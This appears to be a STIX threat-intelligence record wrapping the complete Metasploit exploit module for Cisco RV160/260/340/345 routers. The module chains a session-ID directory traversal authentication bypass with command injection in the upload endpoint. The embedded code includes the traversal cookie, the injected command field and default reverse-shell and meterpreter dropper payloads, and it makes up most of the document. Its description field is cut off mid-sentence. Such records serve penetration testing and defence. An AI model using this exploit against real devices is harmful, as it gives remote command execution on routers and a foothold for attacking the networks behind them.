{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85c41639-9863-41c0-92d3-bcf7c35b3a96",
    "created": "2024-08-14T17:01:07.03198Z",
    "modified": "2024-08-14T17:01:07.031984Z",
    "name": "Cisco RV Series Authentication Bypass and Command Injection",
    "description": " This module exploits two vulnerabilities, a session ID directory traversal authentication",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_rv340_lan.rb",
            "external_id": "cisco_rv340_lan.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco RV Series Authentication Bypass and Command Injection',\n        'Description' => %q{\n          This module exploits two vulnerabilities, a session ID directory traversal authentication\n          bypass (CVE-2022-20705) and a command injection vulnerability (CVE-2022-20707), on Cisco RV160, RV260, RV340,\n          and RV345 Small Business Routers, allowing attackers to execute arbitrary commands with www-data user privileges.\n          This access can then be used to pivot to other parts of the network. This module works on firmware\n          versions 1.0.03.24 and below.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['linux', 'unix'],\n        'Author' => [\n          'Biem Pham',  # Vulnerability Discoveries\n          'Neterum',    # Metasploit Module\n          'jbaines-r7'  # Inspired from cisco_rv_series_authbypass_and_rce.rb\n        ],\n        'DisclosureDate' => '2021-11-02',\n        'Arch' => [ARCH_CMD, ARCH_ARMLE],\n        'References' => [\n          ['CVE', '2022-20705'], # Authentication Bypass\n          ['CVE', '2022-20707'], # Command Injection\n          ['ZDI', '22-410'], # Authentication Bypass\n          ['ZDI', '22-411']  # Command Injection\n        ],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => {\n                'BadChars' => '\\'#'\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'Payload' => {\n                'BadChars' => '\\'#'\n              },\n              'CmdStagerFlavor' => [ 'wget', 'curl' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base path', '/'])\n      ]\n    )\n  end\n\n  # sessionid utilized later needs to be set to length\n  # of 16 or exploit will fail. Tested with lengths\n  # 14-17\n  def generate_session_id\n    return Rex::Text.rand_text_alphanumeric(16)\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => '/upload',\n      'headers' => {\n        'Cookie' => 'sessionid =../../www/index.html; sessionid=' + generate_session_id\n      }\n    }, 10)\n\n    # A proper \"upload\" will trigger file creation. So the send_request_cgi call\n    # above is an incorrect \"upload\" call to avoid creating a file on disk. The router will return\n    # status code 405 Not Allowed if authentication has been bypassed by the above request.\n    # The firmware containing this authentication bypass also contains the command injection\n    # vulnerability that will be abused during actual exploitation. Non-vulnerable\n    # firmware versions will respond with 403 Forbidden.\n    if res.nil?\n      return CheckCode::Unknown('The device did not respond to request packet.')\n    elsif res.code == 405\n      return CheckCode::Appears('The device is vulnerable to authentication bypass. Likely also vulnerable to command injection.')\n    elsif res.code == 403\n      return CheckCode::Safe('The device is not vulnerable to exploitation.')\n    else # Catch-all\n      return CheckCode::Unknown('The target responded in an unexpected way. Exploitation is unlikely.')\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    res = send_exploit(cmd)\n\n    # Successful unix_cmd shells should not produce a response.\n    # However if a response is returned, check the status code and return\n    # Failure::NotVulnerable if it is 403 Forbidden.\n    if target['Type'] == :unix_cmd && res&.code == 403\n      fail_with(Failure::NotVulnerable, 'The target responded with 403 Forbidden and is not vulnerable')\n    end\n\n    if target['Type'] == :linux_dropper\n      fail_with(Failure::Unreachable, 'The target did not respond') unless res\n      fail_with(Failure::UnexpectedReply, 'The target did not respond with a 200 OK') unless res&.code == 200\n      begin\n        body_json = res.get_json_document\n        fail_with(Failure::UnexpectedReply, 'The target did not respond with a JSON body') unless body_json\n      rescue JSON::ParserError => e\n        print_error(\"Failed: #{e.class} - #{e.message}\")\n        fail_with(Failure::UnexpectedReply, 'Failed to parse the response returned from the server! Its possible the response may not be JSON!')\n      end\n    end\n\n    print_good('Exploit successfully executed.')\n  end\n\n  def send_exploit(cmd)\n    filename = Rex::Text.rand_text_alphanumeric(5..12)\n    fileparam = Rex::Text.rand_text_alphanumeric(5..12)\n    input = Rex::Text.rand_text_alphanumeric(5..12)\n\n    # sessionid utilized later needs to be set to length\n    # of 16 or exploit will fail. Tested with lengths\n    # 14-17\n    sessionid = Rex::Text.rand_text_alphanumeric(16)\n\n    filepath = '/tmp/upload.input' # This file must exist and be writeable by www-data so we just use the temporary upload file to prevent issues.\n    pathparam = 'Configuration'\n\n    destination = \"'; \" + cmd + ' #'\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part(filepath, nil, nil, 'form-data; name=\"file.path\"')\n    multipart_form.add_part(filename, nil, nil, 'form-data; name=\"filename\"')\n    multipart_form.add_part(pathparam, nil, nil, 'form-data; name=\"pathparam\"')\n    multipart_form.add_part(fileparam, nil, nil, 'form-data; name=\"fileparam\"')\n    multipart_form.add_part(destination, nil, nil, 'form-data; name=\"destination\"')\n    multipart_form.add_part(input, 'application/octet-stream', nil, format('form-data; name=\"input\"; filename=\"%<filename>s\"', filename: filename))\n\n    # Escaping \"/tmp/upload/\" folder that does not contain any other permanent files\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/upload',\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'headers' => {\n        'Cookie' => 'sessionid =../../www/index.html; sessionid=' + sessionid\n      },\n      'data' => multipart_form.to_s\n    }, 10)\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 120)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-11-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}